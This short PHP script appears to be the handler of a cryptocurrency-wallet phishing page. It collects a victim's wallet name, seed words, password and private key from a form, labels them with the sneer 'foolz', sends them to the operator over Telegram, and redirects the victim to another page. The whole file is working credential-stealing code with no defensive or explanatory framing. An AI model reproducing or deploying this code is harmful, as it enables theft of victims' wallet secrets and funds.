<?php
include 'config.php';
$message .= "--------wallet---foolz--------------------\n\n";
$message .= "walletname: " .$_POST['walletname']."\n";
$message .= "words: " .$_POST['words']."\n";
$message .= "password : ".$_POST['password']."\n";
$message .= "privatekey : ".$_POST['privatekey']."\n\n";
$message .= "--------bye---foolz--------------------\n";
send_telegram_msg($message);
header("Location: submit.php");

?>
        